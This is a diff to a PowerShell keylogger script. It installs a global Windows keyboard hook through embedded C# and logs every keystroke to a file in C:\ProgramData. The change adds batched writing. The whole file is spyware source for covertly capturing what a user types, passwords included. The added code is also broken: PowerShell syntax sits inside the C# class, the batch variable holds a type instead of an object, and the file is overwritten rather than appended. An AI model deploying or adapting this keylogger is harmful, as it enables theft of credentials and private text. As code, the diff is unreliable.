@@ -2,15 +2,29 @@
 $logFile = "C:\ProgramData\keylogger.log"
 $scriptName = "Keylogger.ps1"
 
-# Function to log keystrokes
+# Function to log keystrokes and batch write every 50 characters
 function Log-Message {
     param (
         [string]$message,
-        [string]$level = "INFO"
+        [string]$level = "INFO",
+        [ref]$batch
     )
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $logEntry = "$timestamp [$level] [$scriptName] $message"
-    Add-Content -Path $logFile -Value $logEntry
+
+    # Accumulate keystrokes until 50 characters are reached
+    if ($batch.Value.Length -lt 50) {
+        $batch.Value += " " + $logEntry
+    } else {
+        Write-BatchToFile -Batch $batch -FilePath $logFile
+        $batch.Value = " " + $logEntry
+    }
+}
+
+function Write-BatchToFile($Batch, [string]$FilePath) {
+    # Convert the batch into an array and append to file
+    Set-Content -Path $FilePath -Value ($Batch.Value -join "`n")
+    $Batch.Value.Clear()
 }
 
 # Load user32.dll for key interception
@@ -59,10 +73,14 @@ public class KeyLogger {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
             int vkCode = Marshal.ReadInt32(lParam);
-            Console.WriteLine((ConsoleKey)vkCode);
-            System.IO.File.AppendAllText("C:\\ProgramData\\keylogger.log", ((ConsoleKey)vkCode).ToString() + " ");
+            [KeyLogger]::LogMessage ("$(ConsoleKey)vkCode)", "INFO", $batch)
         }
         return CallNextHookEx(hookID, nCode, wParam, lParam);
+    }
+
+    public static void LogMessage([string]$message, [string]$level = "INFO", [ref]$batch) {
+        param ($message, $level, $batch)
+        Log-Message @PSBoundParameters
     }
 }
 "@
@@ -70,11 +88,16 @@ public class KeyLogger {
 # Compile the C# code and load it into PowerShell
 Add-Type -TypeDefinition $signature -Language CSharp
 
-# Start logging
-Log-Message "Starting global keylogger."
+# Initialize batch with empty string
+$batch = [System.Text.StringBuilder]
 
-# Start the keylogger
+# Set initial log message for starting keylogger
+$logMessage = "Starting global keylogger."
+[KeyLogger]::LogMessage($logMessage, "INFO", $batch)
+
+# Start logging
 [KeyLogger]::Start()
 
 # Keep script running
 while ($true) { Start-Sleep -Seconds 1 }
+
